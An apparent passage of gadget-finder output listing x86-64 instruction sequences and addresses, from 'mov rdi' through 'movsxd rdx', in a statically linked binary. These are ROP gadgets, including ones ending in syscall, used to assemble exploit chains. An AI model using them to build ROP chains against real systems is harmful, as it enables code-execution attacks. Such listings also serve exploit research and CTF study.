0x0000000000452542 : mov rdi, qword ptr [rsp + 0x38] ; call r12
0x0000000000452b7a : mov rdi, qword ptr [rsp + 0x38] ; call r14
0x0000000000455b3e : mov rdi, qword ptr [rsp + 0x38] ; call r15
0x0000000000451d88 : mov rdi, qword ptr [rsp + 0x38] ; call rbx
0x0000000000453fb9 : mov rdi, qword ptr [rsp + 0x40] ; call r15
0x0000000000456765 : mov rdi, qword ptr [rsp + 0x40] ; call rbx
0x0000000000416f35 : mov rdi, qword ptr [rsp] ; add rsp, 0x10 ; pop rbx ; jmp rax
0x000000000048de2b : mov rdi, qword ptr [rsp] ; mov rdx, qword ptr [rbp] ; call r12
0x000000000048dd33 : mov rdi, r12 ; call r15
0x000000000047207f : mov rdi, r12 ; call rbx
0x000000000044a638 : mov rdi, r12 ; mov eax, 0x4f ; syscall
0x00000000004741f7 : mov rdi, r13 ; add r15, r12 ; call 0x400498
0x0000000000422342 : mov rdi, r13 ; call 0x41e585
0x0000000000458a9b : mov rdi, r13 ; call r12
0x000000000048ed1b : mov rdi, r13 ; call r14
0x0000000000492190 : mov rdi, r13 ; call rax
0x000000000040e0a8 : mov rdi, r13 ; mov rax, qword ptr [rsp + 8] ; call rax
0x0000000000414246 : mov rdi, r14 ; call 0x4004ad
0x0000000000458bf2 : mov rdi, r14 ; call rbx
0x0000000000458ed0 : mov rdi, r14 ; call rdx
0x0000000000409f29 : mov rdi, r15 ; call 0x4209c9
0x0000000000472357 : mov rdi, r15 ; call r12
0x0000000000411b42 : mov rdi, r15 ; call rax
0x000000000044f9aa : mov rdi, r15 ; mov rsi, qword ptr [rbp - 0x70] ; call rsi
0x0000000000449349 : mov rdi, rax ; call 0x4004b1
0x0000000000423e23 : mov rdi, rax ; call rcx
0x000000000042416b : mov rdi, rax ; jmp 0x40043d
0x000000000040dc7f : mov rdi, rax ; mov eax, 0xba ; syscall
0x00000000004231a5 : mov rdi, rbp ; call rax
0x0000000000474230 : mov rdi, rbp ; call rbx
0x000000000044ae49 : mov rdi, rbp ; mov eax, 9 ; syscall
0x0000000000474381 : mov rdi, rbp ; mov r9, r14 ; call rbx
0x000000000045d621 : mov rdi, rbx ; call 0x400441
0x00000000004039d0 : mov rdi, rbx ; call 0x4004c5
0x000000000044f3cd : mov rdi, rbx ; call r14
0x0000000000413c15 : mov rdi, rbx ; call rax
0x0000000000416fcc : mov rdi, rbx ; pop rbx ; pop rbp ; jmp rax
0x0000000000470ede : mov rdi, rbx ; pop rbx ; pop rbp ; pop r12 ; jmp rax
0x000000000048cf68 : mov rdx, qword ptr [r12] ; mov edi, 1 ; call rax
0x000000000048ed18 : mov rdx, qword ptr [r15] ; mov rdi, r13 ; call r14
0x000000000048de2f : mov rdx, qword ptr [rbp] ; call r12
0x0000000000484f58 : mov rdx, qword ptr [rbx + 0x18] ; mov qword ptr [rdx], rax ; pop rbx ; ret
0x0000000000484f6c : mov rdx, qword ptr [rdi + 0x30] ; mov qword ptr [rax], rdx ; pop rbx ; ret
0x000000000042fc10 : mov rdx, qword ptr [rsi - 8] ; mov qword ptr [rdi - 8], rdx ; ret
0x0000000000435ea0 : mov rdx, qword ptr [rsi] ; mov qword ptr [rdi], rdx ; ret
0x0000000000482708 : mov rdx, qword ptr [rsp + 0x10] ; call rdx
0x000000000040e2c8 : mov rdx, r12 ; call 0x40df69
0x0000000000489b98 : mov rdx, r13 ; mov rsi, r12 ; mov edi, ebp ; call qword ptr [r14]
0x0000000000489c6c : mov rdx, r13 ; mov rsi, r12 ; mov edi, ebp ; call qword ptr [rax]
0x0000000000489d48 : mov rdx, r13 ; mov rsi, r12 ; mov edi, ebp ; call qword ptr [rcx]
0x0000000000489b52 : mov rdx, r13 ; mov rsi, r12 ; mov edi, ebp ; call rax
0x000000000046f4e1 : mov rdx, r8 ; jmp 0x46f4b1
0x0000000000423e28 : mov rdx, rax ; jmp 0x423ddd
0x0000000000456cb9 : mov rdx, rax ; jmp 0x456c72
0x0000000000456df0 : mov rdx, rax ; jmp 0x456db1
0x00000000004570be : mov rdx, rax ; jmp 0x457077
0x0000000000457135 : mov rdx, rax ; jmp 0x4570ee
0x0000000000475f6d : mov rdx, rax ; jmp 0x475f63
0x000000000041427d : mov rdx, rbp ; add rbp, r13 ; call 0x4004b0
0x000000000047570f : mov rdx, rcx ; mov eax, 0x106 ; syscall
0x0000000000448527 : mov rdx, rdi ; rep stosb byte ptr [rdi], al ; mov rax, rdx ; ret
0x000000000048dde4 : mov rsi, qword ptr [r14] ; call r12
0x000000000048ef3a : mov rsi, qword ptr [r15] ; mov rdi, qword ptr [rsp + 0x10] ; call r14
0x0000000000459963 : mov rsi, qword ptr [rax + r14*8] ; test rsi, rsi ; je 0x459977 ; call rsi
0x000000000044f9ad : mov rsi, qword ptr [rbp - 0x70] ; call rsi
0x000000000044f0c5 : mov rsi, qword ptr [rsp + 0x18] ; mov r9, r13 ; call rbx
0x00000000004231a0 : mov rsi, qword ptr [rsp + 0x28] ; mov rdi, rbp ; call rax
0x0000000000420bb8 : mov rsi, qword ptr [rsp + 0x68] ; call rax
0x0000000000489b9b : mov rsi, r12 ; mov edi, ebp ; call qword ptr [r14]
0x0000000000489c6f : mov rsi, r12 ; mov edi, ebp ; call qword ptr [rax]
0x0000000000489d4b : mov rsi, r12 ; mov edi, ebp ; call qword ptr [rcx]
0x0000000000489b55 : mov rsi, r12 ; mov edi, ebp ; call rax
0x0000000000414243 : mov rsi, r13 ; mov rdi, r14 ; call 0x4004b0
0x000000000048dd30 : mov rsi, r14 ; mov rdi, r12 ; call r15
0x0000000000400588 : mov rsi, rax ; repe cmpsb byte ptr [rsi], byte ptr [rdi] ; jne 0x400599 ; ret
0x000000000044a17b : mov rsi, rbp ; mov edi, ebx ; xor eax, eax ; syscall
0x0000000000423e20 : mov rsi, rbp ; mov rdi, rax ; call rcx
0x0000000000412de8 : mov rsi, rbx ; mov edi, r13d ; mov eax, r9d ; syscall
0x000000000042233f : mov rsi, rbx ; mov rdi, r13 ; call 0x41e588
0x000000000047fb9f : mov rsi, rbx ; syscall
0x0000000000449fc1 : mov rsi, rdi ; mov edi, 0xffffff9c ; syscall
0x000000000048dcd9 : mov rsi, rdi ; mov edi, 1 ; jmp rax
0x000000000047e802 : mov rsi, rdx ; cmp rcx, rsi ; jne 0x47e7e9 ; ret
0x0000000000449eeb : mov rsi, rdx ; mov eax, 4 ; syscall
0x0000000000449f39 : mov rsi, rdx ; mov eax, 5 ; syscall
0x00000000004756bb : mov rsi, rdx ; mov eax, 6 ; syscall
0x0000000000482829 : mov rsp, r8 ; mov rbp, r9 ; nop ; jmp rdx
0x000000000048d7e6 : mov rsp, rcx ; ret
0x000000000046c8f6 : mov ss, word ptr [rax + rax + 0x63490000] ; ret 0x8948
0x0000000000438e75 : mov word ptr [r9 - 2], cx ; ret
0x0000000000420b33 : mov word ptr [rcx], gs ; add byte ptr [rax - 0x77], cl ; ret 0x8348
0x00000000004b22e8 : mov word ptr [rcx], gs ; add byte ptr [rdx + rdx*4 - 5], dl ; jmp qword ptr [rax]
0x000000000044520c : mov word ptr [rdi + 0x10], cx ; lea rax, [rdi + 0x11] ; ret
0x0000000000444b7c : mov word ptr [rdi + 0x10], cx ; ret
0x0000000000445314 : mov word ptr [rdi + 0x18], cx ; lea rax, [rdi + 0x19] ; ret
0x0000000000444c64 : mov word ptr [rdi + 0x18], cx ; ret
0x00000000004360d7 : mov word ptr [rdi + 1], dx ; mov word ptr [rdi], cx ; ret
0x00000000004450d8 : mov word ptr [rdi + 4], dx ; lea rax, [rdi + 5] ; ret
0x0000000000444ab8 : mov word ptr [rdi + 4], dx ; ret
0x000000000044512a : mov word ptr [rdi + 8], dx ; lea rax, [rdi + 9] ; ret
0x0000000000444afa : mov word ptr [rdi + 8], dx ; ret
0x000000000044860a : mov word ptr [rdi + rdx - 2], cx ; mov word ptr [rdi], cx ; ret
0x00000000004478a4 : mov word ptr [rdi + rdx - 2], cx ; mov word ptr [rdi], si ; ret
0x00000000004301ac : mov word ptr [rdi - 2], cx ; ret
0x000000000042ffc4 : mov word ptr [rdi - 2], dx ; ret
0x00000000004301a8 : mov word ptr [rdi - 3], dx ; mov word ptr [rdi - 2], cx ; ret
0x0000000000444a83 : mov word ptr [rdi], cx ; mov byte ptr [rdi + 2], dh ; ret
0x00000000004475e2 : mov word ptr [rdi], cx ; mov word ptr [rsi - 2], cx ; ret
0x00000000004360db : mov word ptr [rdi], cx ; ret
0x0000000000448794 : mov word ptr [rdi], cx ; vzeroupper ; ret
0x0000000000445093 : mov word ptr [rdi], dx ; lea rax, [rdi + 1] ; ret
0x0000000000436143 : mov word ptr [rdi], dx ; ret
0x0000000000438e72 : mov word ptr [rdi], si ; mov word ptr [r9 - 2], cx ; ret
0x00000000004478a9 : mov word ptr [rdi], si ; ret
0x00000000004445f8 : mov word ptr [rdx + 4], ax ; lea rax, [rdx + 5] ; ret
0x0000000000442e38 : mov word ptr [rdx + 4], ax ; mov rax, rdi ; ret
0x00000000004445a3 : mov word ptr [rdx], ax ; lea rax, [rdx + 1] ; ret
0x0000000000442df3 : mov word ptr [rdx], ax ; mov rax, rdi ; ret
0x00000000004475e5 : mov word ptr [rsi - 2], cx ; ret
0x00000000004048cb : mov word ptr [rsp + rcx*4], fs ; add byte ptr [rax], al ; add byte ptr [rcx - 0x77], cl ; ret 0x149
0x00000000004478a3 : mov word ptr ss:[rdi + rdx - 2], cx ; mov word ptr [rdi], si ; ret
0x000000000047bd7c : movabs al, byte ptr [0x5b0e78c085fffcf1] ; ret
0x0000000000447d77 : movabs al, byte ptr [0x77f8c5237f7ec1c4] ; ret
0x0000000000494574 : movabs al, byte ptr [0xa0fff9c1a0fff9bf] ; ret
0x000000000048f6e4 : movabs al, byte ptr [0xf30474c0850022cc] ; ret
0x00000000004a8ee3 : movabs byte ptr [0xd900432ac06c5d01], al ; retf 0xea91
0x000000000047a810 : movabs byte ptr [0xe80000006fba0002], al ; ret
0x00000000004a8b41 : movabs byte ptr [0xeb1b5c347ebb9329], al ; retf
0x00000000004a6f87 : movabs eax, dword ptr [0x2130504dd97d9556] ; retf
0x00000000004a783a : movabs eax, dword ptr [0x95a55d87a0d1e161] ; retf 0x33e6
0x000000000042e732 : movaps xmmword ptr [rdi - 0x10], xmm5 ; jmp r9
0x000000000042e72e : movaps xmmword ptr [rdi - 0x20], xmm4 ; movaps xmmword ptr [rdi - 0x10], xmm5 ; jmp r9
0x000000000042e7dc : movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x000000000040dc6c : movaps xmmword ptr [rsp + 0xf0], xmm0 ; syscall
0x0000000000444b50 : movdqu xmm0, xmmword ptr [rsi] ; movdqu xmmword ptr [rdi], xmm0 ; ret
0x00000000004453cd : movdqu xmmword ptr [rdi + 0x10], xmm2 ; lea rax, [rdi + 0x1f] ; ret
0x0000000000444d1d : movdqu xmmword ptr [rdi + 0x10], xmm2 ; ret
0x0000000000435daf : movdqu xmmword ptr [rdi + 0xa], xmm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x0000000000435d3f : movdqu xmmword ptr [rdi + 0xb], xmm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x0000000000435ccf : movdqu xmmword ptr [rdi + 0xc], xmm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x0000000000435c5f : movdqu xmmword ptr [rdi + 0xd], xmm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x000000000044536d : movdqu xmmword ptr [rdi + 0xd], xmm2 ; lea rax, [rdi + 0x1c] ; ret
0x0000000000444cbd : movdqu xmmword ptr [rdi + 0xd], xmm2 ; ret
0x0000000000435bef : movdqu xmmword ptr [rdi + 0xe], xmm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x000000000044538d : movdqu xmmword ptr [rdi + 0xe], xmm2 ; lea rax, [rdi + 0x1d] ; ret
0x0000000000444cdd : movdqu xmmword ptr [rdi + 0xe], xmm2 ; ret
0x0000000000435b7f : movdqu xmmword ptr [rdi + 0xf], xmm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x00000000004453ad : movdqu xmmword ptr [rdi + 0xf], xmm2 ; lea rax, [rdi + 0x1e] ; ret
0x0000000000444cfd : movdqu xmmword ptr [rdi + 0xf], xmm2 ; ret
0x000000000043619f : movdqu xmmword ptr [rdi + 1], xmm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x000000000043612f : movdqu xmmword ptr [rdi + 2], xmm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x00000000004360bf : movdqu xmmword ptr [rdi + 3], xmm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x000000000043604f : movdqu xmmword ptr [rdi + 4], xmm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x0000000000435fdf : movdqu xmmword ptr [rdi + 5], xmm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x0000000000435f6f : movdqu xmmword ptr [rdi + 6], xmm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x0000000000435eff : movdqu xmmword ptr [rdi + 7], xmm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x0000000000435e8f : movdqu xmmword ptr [rdi + 8], xmm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x0000000000435e1f : movdqu xmmword ptr [rdi + 9], xmm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x000000000044857d : movdqu xmmword ptr [rdi + rdx - 0x20], xmm0 ; ret
0x000000000043530b : movdqu xmmword ptr [rdi - 0x10], xmm0 ; ret
0x000000000043537b : movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x00000000004451e4 : movdqu xmmword ptr [rdi], xmm0 ; lea rax, [rdi + 0xf] ; ret
0x0000000000444b64 : movdqu xmmword ptr [rdi], xmm0 ; mov byte ptr [rdi + 0x10], dh ; ret
0x0000000000444ba7 : movdqu xmmword ptr [rdi], xmm0 ; mov dword ptr [rdi + 0x10], ecx ; ret
0x0000000000444b97 : movdqu xmmword ptr [rdi], xmm0 ; mov dword ptr [rdi + 0xf], ecx ; ret
0x0000000000444c18 : movdqu xmmword ptr [rdi], xmm0 ; mov qword ptr [rdi + 0x10], rcx ; ret
0x0000000000444bd8 : movdqu xmmword ptr [rdi], xmm0 ; mov qword ptr [rdi + 0xe], rcx ; ret
0x0000000000444bf8 : movdqu xmmword ptr [rdi], xmm0 ; mov qword ptr [rdi + 0xf], rcx ; ret
0x0000000000444b78 : movdqu xmmword ptr [rdi], xmm0 ; mov word ptr [rdi + 0x10], cx ; ret
0x0000000000444d19 : movdqu xmmword ptr [rdi], xmm0 ; movdqu xmmword ptr [rdi + 0x10], xmm2 ; ret
0x0000000000444cb9 : movdqu xmmword ptr [rdi], xmm0 ; movdqu xmmword ptr [rdi + 0xd], xmm2 ; ret
0x0000000000444cd9 : movdqu xmmword ptr [rdi], xmm0 ; movdqu xmmword ptr [rdi + 0xe], xmm2 ; ret
0x0000000000444cf9 : movdqu xmmword ptr [rdi], xmm0 ; movdqu xmmword ptr [rdi + 0xf], xmm2 ; ret
0x0000000000435b2a : movdqu xmmword ptr [rdi], xmm0 ; ret
0x0000000000435b84 : movdqu xmmword ptr [rdi], xmm1 ; ret
0x0000000000444b51 : movq mm0, qword ptr [rsi] ; movdqu xmmword ptr [rdi], xmm0 ; ret
0x00000000004453ce : movq qword ptr [rdi + 0x10], mm2 ; lea rax, [rdi + 0x1f] ; ret
0x0000000000444d1e : movq qword ptr [rdi + 0x10], mm2 ; ret
0x0000000000435db0 : movq qword ptr [rdi + 0xa], mm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x0000000000435d40 : movq qword ptr [rdi + 0xb], mm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x0000000000435cd0 : movq qword ptr [rdi + 0xc], mm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x0000000000435c60 : movq qword ptr [rdi + 0xd], mm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x000000000044536e : movq qword ptr [rdi + 0xd], mm2 ; lea rax, [rdi + 0x1c] ; ret
0x0000000000444cbe : movq qword ptr [rdi + 0xd], mm2 ; ret
0x0000000000435bf0 : movq qword ptr [rdi + 0xe], mm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x000000000044538e : movq qword ptr [rdi + 0xe], mm2 ; lea rax, [rdi + 0x1d] ; ret
0x0000000000444cde : movq qword ptr [rdi + 0xe], mm2 ; ret
0x0000000000435b80 : movq qword ptr [rdi + 0xf], mm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x00000000004453ae : movq qword ptr [rdi + 0xf], mm2 ; lea rax, [rdi + 0x1e] ; ret
0x0000000000444cfe : movq qword ptr [rdi + 0xf], mm2 ; ret
0x00000000004361a0 : movq qword ptr [rdi + 1], mm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x0000000000436130 : movq qword ptr [rdi + 2], mm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x00000000004360c0 : movq qword ptr [rdi + 3], mm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x0000000000436050 : movq qword ptr [rdi + 4], mm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x0000000000435fe0 : movq qword ptr [rdi + 5], mm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x0000000000435f70 : movq qword ptr [rdi + 6], mm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x0000000000435f00 : movq qword ptr [rdi + 7], mm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x0000000000435e90 : movq qword ptr [rdi + 8], mm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x0000000000435e20 : movq qword ptr [rdi + 9], mm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x0000000000448505 : movq qword ptr [rdi + rdx - 0x10], mm0 ; movdqu xmmword ptr [rdi], xmm0 ; ret
0x000000000044857e : movq qword ptr [rdi + rdx - 0x20], mm0 ; ret
0x000000000043530c : movq qword ptr [rdi - 0x10], mm0 ; ret
0x000000000043537c : movq qword ptr [rdi - 0x10], mm1 ; ret
0x0000000000435ab7 : movq qword ptr [rdi - 0x11], mm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x0000000000435a37 : movq qword ptr [rdi - 0x12], mm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x00000000004359a7 : movq qword ptr [rdi - 0x13], mm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x0000000000435927 : movq qword ptr [rdi - 0x14], mm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x00000000004358a7 : movq qword ptr [rdi - 0x15], mm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x0000000000435827 : movq qword ptr [rdi - 0x16], mm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x00000000004357a7 : movq qword ptr [rdi - 0x17], mm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x0000000000435727 : movq qword ptr [rdi - 0x18], mm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x00000000004356a7 : movq qword ptr [rdi - 0x19], mm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x0000000000435627 : movq qword ptr [rdi - 0x1a], mm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x00000000004355a7 : movq qword ptr [rdi - 0x1b], mm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x0000000000435527 : movq qword ptr [rdi - 0x1c], mm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x0000000000435497 : movq qword ptr [rdi - 0x1d], mm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x0000000000435407 : movq qword ptr [rdi - 0x1e], mm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x0000000000435377 : movq qword ptr [rdi - 0x1f], mm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x00000000004451e5 : movq qword ptr [rdi], mm0 ; lea rax, [rdi + 0xf] ; ret
0x0000000000444b65 : movq qword ptr [rdi], mm0 ; mov byte ptr [rdi + 0x10], dh ; ret
0x0000000000444bb8 : movq qword ptr [rdi], mm0 ; mov dword ptr [rdi + 0x10], ecx ; mov byte ptr [rdi + 0x14], dh ; ret
0x0000000000444ba8 : movq qword ptr [rdi], mm0 ; mov dword ptr [rdi + 0x10], ecx ; ret
0x0000000000444b98 : movq qword ptr [rdi], mm0 ; mov dword ptr [rdi + 0xf], ecx ; ret
0x0000000000444c19 : movq qword ptr [rdi], mm0 ; mov qword ptr [rdi + 0x10], rcx ; ret
0x0000000000444bd9 : movq qword ptr [rdi], mm0 ; mov qword ptr [rdi + 0xe], rcx ; ret
0x0000000000444bf9 : movq qword ptr [rdi], mm0 ; mov qword ptr [rdi + 0xf], rcx ; ret
0x0000000000444b79 : movq qword ptr [rdi], mm0 ; mov word ptr [rdi + 0x10], cx ; ret
0x0000000000444d1a : movq qword ptr [rdi], mm0 ; movdqu xmmword ptr [rdi + 0x10], xmm2 ; ret
0x0000000000444cba : movq qword ptr [rdi], mm0 ; movdqu xmmword ptr [rdi + 0xd], xmm2 ; ret
0x0000000000444cda : movq qword ptr [rdi], mm0 ; movdqu xmmword ptr [rdi + 0xe], xmm2 ; ret
0x0000000000444cfa : movq qword ptr [rdi], mm0 ; movdqu xmmword ptr [rdi + 0xf], xmm2 ; ret
0x0000000000435b2b : movq qword ptr [rdi], mm0 ; ret
0x0000000000435b85 : movq qword ptr [rdi], mm1 ; ret
0x000000000045811c : movsb byte ptr [rdi], byte ptr [rsi] ; and al, 0x88 ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret
0x0000000000447805 : movsb byte ptr [rdi], byte ptr [rsi] ; cld ; ret
0x00000000004a7c62 : movsb byte ptr [rdi], byte ptr [rsi] ; in eax, 0x24 ; outsd dx, dword ptr es:[rsi] ; ret 0x5ae4
0x00000000004a8ebd : movsb byte ptr [rdi], byte ptr [rsi] ; jns 0x4a8f16 ; jmp 0x4a8e57
0x0000000000461278 : movsb byte ptr [rdi], byte ptr [rsi] ; pop rax ; and eax, 0x48b4800 ; clc ; jmp rax
0x00000000004477f7 : movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x000000000045ac4c : movsb byte ptr [rdi], byte ptr [rsi] ; retf 3
0x00000000004a6b45 : movsb byte ptr [rdi], byte ptr [rsi] ; sub eax, 0xea4ca798 ; retf
0x000000000047fa8c : movsb byte ptr [rdi], byte ptr [rsi] ; xor eax, eax ; ret
0x00000000004b5f35 : movsd dword ptr [rdi], dword ptr [rsi] ; add byte ptr [rax], al ; test al, 0x9f ; std ; jmp qword ptr [rax]
0x0000000000495309 : movsd dword ptr [rdi], dword ptr [rsi] ; cli ; call qword ptr [rax - 0x1f00055a]
0x00000000004a915d : movsd dword ptr [rdi], dword ptr [rsi] ; fxch st(0), st(6) ; mov bl, 0xe ; or dh, al ; mov ebx, dword ptr [rdx] ; retf 0x7272
0x00000000004a94f5 : movsd dword ptr [rdi], dword ptr [rsi] ; int1 ; ret 0x5803
0x00000000004a8db1 : movsd dword ptr [rdi], dword ptr [rsi] ; mov cl, byte ptr [rip - 0x114f09b0] ; fcmovb st(0), st(3) ; ret
0x000000000046beb7 : movsd dword ptr [rdi], dword ptr [rsi] ; or al, 0 ; add byte ptr [rcx + 1], al ; ret 0x8b48
0x0000000000482ef2 : movsd dword ptr [rdi], dword ptr [rsi] ; ret
0x000000000046c877 : movsd dword ptr [rdi], dword ptr [rsi] ; test eax, 0x8b480024 ; add al, 0xf8 ; jmp rax
0x00000000004a7841 : movsd dword ptr [rdi], dword ptr [rsi] ; xchg eax, ebp ; retf 0x33e6
0x000000000048aef4 : movss dword ptr [rsp - 0x28], xmm0 ; ret
0x0000000000480fbb : movsx eax, cl ; neg eax ; ret
0x0000000000481060 : movsx eax, dl ; sub eax, ecx ; ret
0x00000000004251a1 : movsxd r9, dword ptr [r10 + r9*4] ; lea r10, [r10 + r9] ; jmp r10
0x000000000043378b : movsxd r9, dword ptr [r11 + r9*4] ; add r9, r11 ; jmp r9
0x000000000042e20b : movsxd r9, dword ptr [r11 + r9*4] ; lea r9, [r11 + r9] ; jmp r9
0x000000000048c198 : movsxd rax, dword ptr [r12 + rax*4] ; add rax, r12 ; jmp rax
0x000000000040229e : movsxd rax, dword ptr [r13 + rax*4] ; add rax, r13 ; jmp rax
0x000000000048ca99 : movsxd rax, dword ptr [r14 + rax*4] ; add rax, r14 ; jmp rax
0x000000000048b147 : movsxd rax, dword ptr [r15 + rax*4] ; add rax, r15 ; jmp rax
0x000000000048af21 : movsxd rax, dword ptr [r8 + rcx*4] ; add rax, r8 ; jmp rax
0x000000000048c6d1 : movsxd rax, dword ptr [r9 + r11*4] ; add rax, r9 ; jmp rax
0x000000000048af22 : movsxd rax, dword ptr [rax + rcx*4] ; add rax, r8 ; jmp rax
0x00000000004173de : movsxd rax, dword ptr [rax - 0x77] ; add ebx, dword ptr [rbx + 0x5d] ; pop r12 ; ret
0x00000000004b1d1d : movsxd rax, dword ptr [rax] ; add al, al ; mov ch, 0xfa ; call qword ptr [rbx]
0x000000000044c621 : movsxd rax, dword ptr [rax] ; add byte ptr [rax], al ; syscall
0x00000000004a7be0 : movsxd rax, dword ptr [rbp + 0x275dcc4c] ; retf 0xd1cb
0x000000000040229f : movsxd rax, dword ptr [rbp + rax*4] ; add rax, r13 ; jmp rax
0x000000000044de4f : movsxd rax, dword ptr [rbp + rax*4] ; add rax, rbp ; jmp rax
0x000000000044ddd8 : movsxd rax, dword ptr [rbx + rax*4] ; add rax, rbx ; jmp rax
0x000000000046139d : movsxd rax, dword ptr [rbx - 0x52743] ; call qword ptr [rax]
0x000000000047c22d : movsxd rax, dword ptr [rcx + r12*4] ; add rax, rcx ; jmp rax
0x000000000046ebd7 : movsxd rax, dword ptr [rcx + rax*4] ; add rax, rcx ; jmp rax
0x000000000048c6d2 : movsxd rax, dword ptr [rcx + rbx*4] ; add rax, r9 ; jmp rax
0x000000000044785d : movsxd rax, dword ptr [rcx] ; add byte ptr [rax], al ; mov rcx, rdx ; rep movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x000000000047c22e : movsxd rax, dword ptr [rcx] ; add rax, rcx ; jmp rax
0x000000000047cb55 : movsxd rax, dword ptr [rdi + r12*4] ; add rax, rdi ; jmp rax
0x000000000048b148 : movsxd rax, dword ptr [rdi + rax*4] ; add rax, r15 ; jmp rax
0x000000000046f207 : movsxd rax, dword ptr [rdi + rax*4] ; add rax, rdi ; jmp rax
0x000000000047cb56 : movsxd rax, dword ptr [rdi] ; add rax, rdi ; jmp rax
0x0000000000402036 : movsxd rax, dword ptr [rdx + rax*4] ; add rax, rdx ; jmp rax
0x0000000000449b74 : movsxd rax, dword ptr [rdx + rbx*4] ; add rax, rdx ; jmp rax
0x000000000048ca9a : movsxd rax, dword ptr [rsi + rax*4] ; add rax, r14 ; jmp rax
0x000000000046ea6b : movsxd rax, dword ptr [rsi + rax*4] ; add rax, rsi ; jmp rax
0x00000000004489c8 : movsxd rax, dword ptr [rsi + rdi*4] ; add rax, rsi ; jmp rax
0x0000000000448a82 : movsxd rax, dword ptr [rsi + rdx*4] ; add rax, rsi ; jmp rax
0x000000000048c199 : movsxd rax, dword ptr [rsp + rax*4] ; add rax, r12 ; jmp rax
0x00000000004853ad : movsxd rax, ecx ; add rax, rdi ; sub rax, r8 ; ret
0x0000000000447497 : movsxd rax, ecx ; add rax, rdi ; sub rax, rsi ; ret
0x0000000000447444 : movsxd rax, ecx ; ret
0x00000000004a8a0a : movsxd rbx, dword ptr [rsi + rax*8 + 0x74] ; retf 0x93a2
0x0000000000447489 : movsxd rbx, ecx ; add cl, byte ptr [rdi] ; xchg eax, edx ; ror byte ptr [rdi], 0x94 ; ret 0xc085
0x000000000042cb3d : movsxd rcx, dword ptr [r11 + rdx*4] ; add rcx, r11 ; jmp rcx
0x0000000000444919 : movsxd rcx, dword ptr [r11 + rdx*4] ; lea rcx, [r11 + rcx] ; jmp rcx
0x0000000000424696 : movsxd rcx, dword ptr [rax - 0x7d] ; ret 0xe901
0x000000000043378c : movsxd rcx, dword ptr [rbx + rcx*4] ; add r9, r11 ; jmp r9
0x000000000042e20c : movsxd rcx, dword ptr [rbx + rcx*4] ; lea r9, [r11 + r9] ; jmp r9
0x000000000042cb3e : movsxd rcx, dword ptr [rbx + rdx*4] ; add rcx, r11 ; jmp rcx
0x000000000044491a : movsxd rcx, dword ptr [rbx + rdx*4] ; lea rcx, [r11 + rcx] ; jmp rcx
0x00000000004251a2 : movsxd rcx, dword ptr [rdx + rcx*4] ; lea r10, [r10 + r9] ; jmp r10
0x00000000004489f0 : movsxd rcx, dword ptr [rsi + rax*4] ; add rcx, rsi ; jmp rcx
0x00000000004474d7 : movsxd rcx, ecx ; lea rax, [rdi + rcx] ; sub rax, rsi ; ret
0x000000000040d637 : movsxd rdi, dword ptr [r10 + rdi*4] ; add rdi, r10 ; jmp rdi
0x000000000045ac5f : movsxd rdi, dword ptr [r11 + rsi*4] ; add rdi, r11 ; jmp rdi
0x000000000045ac60 : movsxd rdi, dword ptr [rbx + rsi*4] ; add rdi, r11 ; jmp rdi
0x000000000040d638 : movsxd rdi, dword ptr [rdx + rdi*4] ; add rdi, r10 ; jmp rdi
0x000000000042e2df : movsxd rdx, dword ptr [r11 + rdx*4] ; lea rdx, [r11 + rdx] ; jmp rdx
0x000000000042e2e0 : movsxd rdx, dword ptr [rbx + rdx*4] ; lea rdx, [r11 + rdx] ; jmp rdx
